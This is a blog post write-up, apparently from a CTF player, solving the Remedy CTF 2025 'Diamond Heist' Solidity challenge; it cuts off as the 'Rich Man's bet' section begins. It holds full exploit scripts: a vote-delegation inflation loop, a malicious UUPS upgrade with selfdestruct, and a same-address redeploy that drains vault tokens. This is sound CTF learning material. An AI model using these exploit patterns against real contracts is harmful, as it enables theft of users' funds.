<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" data-mode="dark">
  <!-- The Head -->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  >

  

  

  
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="Remedy CTF 2025 (Diamond, Rich, Casino)" />
<meta name="author" content="anonymous" />
<meta property="og:locale" content="en" />
<meta name="description" content="i could solve only three easy solidity challs :/ but in the casino challenge, i was able to bypass the signature but not the bet() function. hope that i will be better" />
<meta property="og:description" content="i could solve only three easy solidity challs :/ but in the casino challenge, i was able to bypass the signature but not the bet() function. hope that i will be better" />
<link rel="canonical" href="http://localhost:4000/posts/Remedy-CTF2525/" />
<meta property="og:url" content="http://localhost:4000/posts/Remedy-CTF2525/" />
<meta property="og:site_name" content="Web3.0" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-01-26T00:00:00+09:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Remedy CTF 2025 (Diamond, Rich, Casino)" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"anonymous"},"dateModified":"2025-01-26T00:00:00+09:00","datePublished":"2025-01-26T00:00:00+09:00","description":"i could solve only three easy solidity challs :/ but in the casino challenge, i was able to bypass the signature but not the bet() function. hope that i will be better","headline":"Remedy CTF 2025 (Diamond, Rich, Casino)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/Remedy-CTF2525/"},"url":"http://localhost:4000/posts/Remedy-CTF2525/"}</script>
<!-- End Jekyll SEO tag -->

  

  <title>Remedy CTF 2025 (Diamond, Rich, Casino) | Web3.0
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<meta name="apple-mobile-web-app-title" content="Web3.0">
<meta name="application-name" content="Web3.0">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">
  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.2/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.21.3/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle">
      
        
        <img src="/assets/img/eth.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'">
      
    </a>

    <h1 class="site-title">
      <a href="/">Web3.0</a>
    </h1>
    <p class="site-subtitle fst-italic mb-0">Dive into a new world</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/categories/" class="nav-link">
            <i class="fa-fw fas fa-stream"></i>
            

            <span>CATEGORIES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>ARCHIVES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    

    
      

      
        <a
          href="https://etherscan.io/address/0x592830D280113C3774716fe75574F8AF7461cbd1"
          aria-label="wallet"
          

          

          

          
        >
          <i class="fab fa-ethereum"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">
                Home
              </a>
            </span>

          
        
          
        
          
            
              <span>Remedy CTF 2025 (Diamond, Rich, Casino)</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  <!-- CDN URL -->
  

  <!-- Add image path -->
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  




<!-- return -->




<article class="px-1">
  <header>
    <h1 data-toc-skip>Remedy CTF 2025 (Diamond, Rich, Casino)</h1>

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1737817200"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Jan 26, 2025
</time>

      </span>

      <!-- lastmod date -->
      

      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              
                anonymous
                
              
            
          </em>
        </span>

        <!-- read time -->
        <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="4039 words"
>
  <em>22 min</em> read</span>

      </div>
      <!-- .d-flex -->
    </div>
    <!-- .post-meta -->
  </header>

  <div class="content">
    <p>i could solve only three easy solidity challs :/ but in the casino challenge, i was able to bypass the signature but not the <code class="language-plaintext highlighter-rouge">bet()</code> function. hope that i will be better</p>

<hr />
<h2 id="diamoand-heist"><span class="me-2">Diamoand Heist</span><a href="#diamoand-heist" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre>    uint constant public DIAMONDS = 31337;
    uint constant public HEXENS_COINS = 10_000 ether;
    bool claimed;
    
    constructor (address player) {
        PLAYER = player;
        vaultFactory = new VaultFactory();
        vault = vaultFactory.createVault(keccak256("The tea in Nepal is very hot. But the coffee in Peru is much hotter."));
        diamond = new Diamond(DIAMONDS);
        hexensCoin = new HexensCoin();
        vault.initialize(address(diamond), address(hexensCoin));
        diamond.transfer(address(vault), DIAMONDS);
    }

// (...) Skip
    function isSolved() external view returns (bool) {
        return diamond.balanceOf(PLAYER) == DIAMONDS;
    }
</pre></td></tr></tbody></table></code></div></div>
<p>we should take 31337 tokens to solve this challenge and diamond is ERC20 token and it already been transferred 31337 tokens to the Vault</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td><td class="rouge-code"><pre>contract Vault is Initializable, UUPSUpgradeable, OwnableUpgradeable {

    uint constant public AUTHORITY_THRESHOLD = 100_000 ether;

    Diamond diamond;
    HexensCoin hexensCoin;

    function initialize(address diamond_, address hexensCoin_) public initializer {
        __Ownable_init();
        diamond = Diamond(diamond_);
        hexensCoin = HexensCoin(hexensCoin_);
    }

    function governanceCall(bytes calldata data) external {
        require(msg.sender == owner() || hexensCoin.getCurrentVotes(msg.sender) &gt;= AUTHORITY_THRESHOLD);
        (bool success,) = address(this).call(data);
        require(success);
    }

    function burn(address token, uint amount) external {
        require(msg.sender == owner() || msg.sender == address(this));
        Burner burner = new Burner();
        IERC20(token).transfer(address(burner), amount);
        burner.destruct();
    }
    
    function _authorizeUpgrade(address) internal override view {
        require(msg.sender == owner() || msg.sender == address(this));
        require(IERC20(diamond).balanceOf(address(this)) == 0);
    }
}
</pre></td></tr></tbody></table></code></div></div>
<p>if we can call the <code class="language-plaintext highlighter-rouge">governanceCall()</code> function, we can abuse the Vault Contract but we need to vote 100_000 ether for it. (but we have only 10_000 ether :/)</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre></td><td class="rouge-code"><pre>    function _delegate(address delegator, address delegatee)
        internal
    {
        address currentDelegate = _delegates[delegator];
        uint256 delegatorBalance = balanceOf(delegator);
        _delegates[delegator] = delegatee;

        emit DelegateChanged(delegator, currentDelegate, delegatee);

        _moveDelegates(currentDelegate, delegatee, delegatorBalance);
    }

    function _moveDelegates(address srcRep, address dstRep, uint256 amount) internal {
        if (srcRep != dstRep &amp;&amp; amount &gt; 0) {
            if (srcRep != address(0)) {
                uint32 srcRepNum = numCheckpoints[srcRep];
                uint256 srcRepOld = srcRepNum &gt; 0 ? checkpoints[srcRep][srcRepNum - 1].votes : 0;
                uint256 srcRepNew = srcRepOld - amount;
                _writeCheckpoint(srcRep, srcRepNum, srcRepOld, srcRepNew);
            }

            if (dstRep != address(0)) {
                uint32 dstRepNum = numCheckpoints[dstRep];
                uint256 dstRepOld = dstRepNum &gt; 0 ? checkpoints[dstRep][dstRepNum - 1].votes : 0;
                uint256 dstRepNew = dstRepOld + amount;
                _writeCheckpoint(dstRep, dstRepNum, dstRepOld, dstRepNew);
            }
        }
    }
</pre></td></tr></tbody></table></code></div></div>
<p>they provided only 10_000 ether so we cannot vote for 100_000 ether in general but we can exploit the process of delegated voting. however if srcRep is not zero address in _moveDeleages, it subtracts amout we want to vote from old votes.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre>player → user2 (10_000 ether)
_delegate(user2, player)
player.votes = 10_000 ether
_deleages[user2] = player
user2 → player (10_000 ether)

player→user3 (10_000 ether)
_deleagete(user3, player) 
at this time, the sender is different so srcRep is zero address  even though we voted before. therefore our vote won’t go through the process to subtraction
player.votes = 20_000 ether
_delegates[user3] = player
user3 → player (10_000 ether)
</pre></td></tr></tbody></table></code></div></div>
<p>however we can solve this issue with the way to delegate to player from new CA. therefore, we should transfer 10_000 ether to new CA then the CA should transfer it back to player after delegation. ⇒ we can get 100_000 ether votes after repeating it 10 times</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre></td><td class="rouge-code"><pre>// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import "forge-std/Script.sol";
import "../src/Challenge.sol";
import "../src/HexensCoin.sol";

contract ASDF {
    HexensCoin public hexensCoin;
    address public player;
    constructor (address hexens, address _player) {
        hexensCoin = HexensCoin(hexens);
        player = _player;
    }

    function votesTransfer() external {
        hexensCoin.delegate(player);
        hexensCoin.transfer(player, 10_000 ether);
    }
}

contract Solve is Script {
    address private challengeAddress = 0x32fFc5cC2567c69a31dc2d0E71579A325828Af5F;
    uint256 private playerPrivateKey = 0xb0f205587a31546a5ebb5ac2f42bbaf6a6ffe841192610a98349c63f3a82a466;

    function run() external {
        vm.startBroadcast(playerPrivateKey);

        Challenge challenge = Challenge(challengeAddress);
        HexensCoin hexensCoin = challenge.hexensCoin();
        address hexen_addr = address(hexensCoin);
        address player = vm.addr(playerPrivateKey);

        challenge.claim();
        for(uint i = 0; i &lt; 10; i++){
            ASDF asdf = new ASDF(hexen_addr, player);
            hexensCoin.transfer(address(asdf), 10_000 ether);
            asdf.votesTransfer();
        }

        console.log("votes : ", hexensCoin.getCurrentVotes(player));
        vm.stopBroadcast();
    }
}
</pre></td></tr></tbody></table></code></div></div>
<p><a href="https://media.discordapp.net/attachments/1324169819637022723/1333147858634801152/image.png?ex=6797d632&amp;is=679684b2&amp;hm=93bed614477723ff21ae297cf8e146a7fa1f6fc16c49ad32cc48dd33ef21b81d&amp;=&amp;format=webp&amp;quality=lossless&amp;width=2604&amp;height=770" class="popup img-link  shimmer"><img src="https://media.discordapp.net/attachments/1324169819637022723/1333147858634801152/image.png?ex=6797d632&amp;is=679684b2&amp;hm=93bed614477723ff21ae297cf8e146a7fa1f6fc16c49ad32cc48dd33ef21b81d&amp;=&amp;format=webp&amp;quality=lossless&amp;width=2604&amp;height=770" alt="" loading="lazy"></a>
now we have 100_000 ether votes  so can call the <code class="language-plaintext highlighter-rouge">governanceCall()</code> function of Vault.sol.  we need to think what we can do with <code class="language-plaintext highlighter-rouge">governanceCall()</code> function.</p>

<p>first of all, we know that the vault contract has 31337 tokens but we cannot transfer it to our address by <code class="language-plaintext highlighter-rouge">governanceCall()</code> function but the Contract is implemented with the UUPSUpgradeable protocol so it can be upgrade to our contract</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre>    function burn(address token, uint amount) external {
        require(msg.sender == owner() || msg.sender == address(this));
        Burner burner = new Burner();
        IERC20(token).transfer(address(burner), amount);
        burner.destruct();
    }
    
    function _authorizeUpgrade(address) internal override view {
        require(msg.sender == owner() || msg.sender == address(this));
        require(IERC20(diamond).balanceOf(address(this)) == 0);
    }
</pre></td></tr></tbody></table></code></div></div>
<p>but to upgrade, Vault’s balance of diamond should 0 so we should call the <code class="language-plaintext highlighter-rouge">burn()</code> function to transfer token to burner address. (buner will be destroyed too). that means we shoud re-use buner address.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>address = keccak256(rlp([deployer_address, nonce]))[12:]
</pre></td></tr></tbody></table></code></div></div>
<p>however in EVM, addresses are generated as above (msg.sender, nonce), so this is not a big problem. we’re gonna destroy contract then deploy again with our contract, it will deploy on the same address</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre>    function _upgradeToAndCallUUPS(
        address newImplementation,
        bytes memory data,
        bool forceCall
    ) internal {
        // Upgrades from old implementations will perform a rollback test. This test requires the new
        // implementation to upgrade back to the old, non-ERC1822 compliant, implementation. Removing
        // this special case will break upgrade paths from old UUPS implementation to new ones.
        if (StorageSlot.getBooleanSlot(_ROLLBACK_SLOT).value) {
            _setImplementation(newImplementation);
        } else {
            try IERC1822Proxiable(newImplementation).proxiableUUID() returns (bytes32 slot) {
                require(slot == _IMPLEMENTATION_SLOT, "ERC1967Upgrade: unsupported proxiableUUID");
            } catch {
                revert("ERC1967Upgrade: new implementation is not UUPS");
            }
            _upgradeToAndCall(newImplementation, data, forceCall);
</pre></td></tr></tbody></table></code></div></div>
<p><code class="language-plaintext highlighter-rouge">_upgradeToAndCallUUPS()</code> function of ERC1967Upgrade will call the <code class="language-plaintext highlighter-rouge">proxiableUUID()</code> function from our contract so we should define it.</p>

<h3 id="solvesol"><span class="me-2">Solve.sol</span><a href="#solvesol" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
</pre></td><td class="rouge-code"><pre>// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import "forge-std/Script.sol";
import "../src/Challenge.sol";
import "../src/HexensCoin.sol";
import "../src/MaliciousVault.sol";

contract ASDF {
    HexensCoin public hexensCoin;
    address public player;
    constructor (address hexens, address _player) {
        hexensCoin = HexensCoin(hexens);
        player = _player;
    }

    function votesTransfer() external {
        hexensCoin.delegate(player);
        hexensCoin.transfer(player, 10_000 ether);
    }
}

contract Solve is Script {
    address private challengeAddress = 0xA496102C58a59bfec07c14b08C1b976fd242ec91;
    uint256 private playerPrivateKey = 0xfc986909eb13d86baa48c0d89e4c25ead0b2967ade984e9805a09bdeacb7baf0;

    function run() external {
        vm.startBroadcast(playerPrivateKey);

        Challenge challenge = Challenge(challengeAddress);
        HexensCoin hexensCoin = challenge.hexensCoin();
        address factoryAddress = address(challenge.vaultFactory());
        address vaultAddress = address(challenge.vault());
        address diamondAddress = address(challenge.diamond());
        address hexen_addr = address(hexensCoin);
        address player = vm.addr(playerPrivateKey);

        challenge.claim();
        for(uint i = 0; i &lt; 10; i++){
            ASDF asdf = new ASDF(hexen_addr, player);
            hexensCoin.transfer(address(asdf), 10_000 ether);
            asdf.votesTransfer();
        }
        require(hexensCoin.getCurrentVotes(player) == 100_000 ether);
        console.log("votes : ", hexensCoin.getCurrentVotes(player));
        
        bytes memory burnData = abi.encodeWithSignature(
            "burn(address,uint256)",
            diamondAddress,
            IERC20(diamondAddress).balanceOf(vaultAddress)
        );
        Vault(vaultAddress).governanceCall(burnData);

        MaliciousVault maliciousImplementation = new MaliciousVault();
        console.log("maliciousImplementation : ", address(maliciousImplementation));
        bytes memory upgradeData = abi.encodeWithSignature(
            "upgradeTo(address)",
            address(maliciousImplementation)
        );
        Vault(vaultAddress).governanceCall(upgradeData);

        bytes memory selfDestructData = abi.encodeWithSignature("selfDestruct()");
        vaultAddress.call(selfDestructData);
        vm.stopBroadcast();
    }
}
</pre></td></tr></tbody></table></code></div></div>

<h3 id="solve1sol"><span class="me-2">Solve1.sol</span><a href="#solve1sol" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
</pre></td><td class="rouge-code"><pre>// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import "forge-std/Script.sol";
import "../src/Challenge.sol";
import "../src/HexensCoin.sol";
import "../src/MaliciousVault.sol";

contract Solve1 is Script {
    address private challengeAddress = 0xA496102C58a59bfec07c14b08C1b976fd242ec91;
    uint256 private playerPrivateKey = 0xfc986909eb13d86baa48c0d89e4c25ead0b2967ade984e9805a09bdeacb7baf0;

    function run() external {
        vm.startBroadcast(playerPrivateKey);

        Challenge challenge = Challenge(challengeAddress);
        HexensCoin hexensCoin = challenge.hexensCoin();
        Vault vault = challenge.vault();

        address factoryAddress = address(challenge.vaultFactory());
        address vaultAddress = address(challenge.vault());
        address diamondAddress = address(challenge.diamond());
        address hexen_addr = address(hexensCoin);
        address player = vm.addr(playerPrivateKey);

        Diamond diamond = challenge.diamond();
        VaultFactory factory = VaultFactory(factoryAddress);
        bytes32 salt = keccak256("The tea in Nepal is very hot. But the coffee in Peru is much hotter.");
        Vault newVault = factory.createVault(salt);
        newVault.initialize(address(diamond), address(hexensCoin));

        MaliciousVault maliciousImplementation = new MaliciousVault();
        bytes memory upgradeNewVaultData = abi.encodeWithSignature(
            "upgradeTo(address)",
            address(maliciousImplementation)
        );
        vault.governanceCall(upgradeNewVaultData);

        bytes memory transferData = abi.encodeWithSignature(
            "_CREATE2(address,address)",
            diamondAddress,
            player
        );

        address(newVault).call(transferData);
        console.log("diamond.balanceOf(PLAYER) : ", diamond.balanceOf(player));
        vm.stopBroadcast();
    }
}
</pre></td></tr></tbody></table></code></div></div>

<h3 id="maliciousvaultsol"><span class="me-2">MaliciousVault.sol</span><a href="#maliciousvaultsol" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre></td><td class="rouge-code"><pre>// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;
import "./openzeppelin-contracts/token/ERC20/ERC20.sol";
import "../src/MaliciousVault.sol";

contract MaliciousVault {
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    function proxiableUUID() external view returns (bytes32) {
        return _IMPLEMENTATION_SLOT;
    }
    
    function selfDestruct() external {
        selfdestruct(payable(msg.sender));
    }

    function _CREATE2(address _diamond, address player) external {
        LastOne lastone = new LastOne(_diamond, player);
    }
}

contract LastOne {
    constructor(address diamond, address player) {
        IERC20(diamond).transfer(player, IERC20(diamond).balanceOf(address(this)));
    }
}
</pre></td></tr></tbody></table></code></div></div>

<p><a href="https://media.discordapp.net/attachments/1324169819637022723/1333148410575847494/image.png?ex=6797d6b5&amp;is=67968535&amp;hm=e19b442157ee41c45779d126a53eefa9583451957f18bc5bc37fb25d5cd9429f&amp;=&amp;format=webp&amp;quality=lossless&amp;width=1100&amp;height=312" class="popup img-link  shimmer"><img src="https://media.discordapp.net/attachments/1324169819637022723/1333148410575847494/image.png?ex=6797d6b5&amp;is=67968535&amp;hm=e19b442157ee41c45779d126a53eefa9583451957f18bc5bc37fb25d5cd9429f&amp;=&amp;format=webp&amp;quality=lossless&amp;width=1100&amp;height=312" alt="" loading="lazy"></a></p>

<p>so just attack to get the flag using this logic</p>

<hr />
<h2 id="rich-mans-bet"><span class="me-2">Rich Man’s bet</span><a href="#rich-mans-bet" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>    function isSolved() external view returns (bool) {
        return challengeSolved 
            &amp;&amp; solver == PLAYER 
            &amp;&amp; address(BRIDGE).balance == 0;
    }
</pre></td></tr></tbody></table></code></div></div>
<p>we should solve easy math challenge then drain the balance of the BRIDGE contract</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
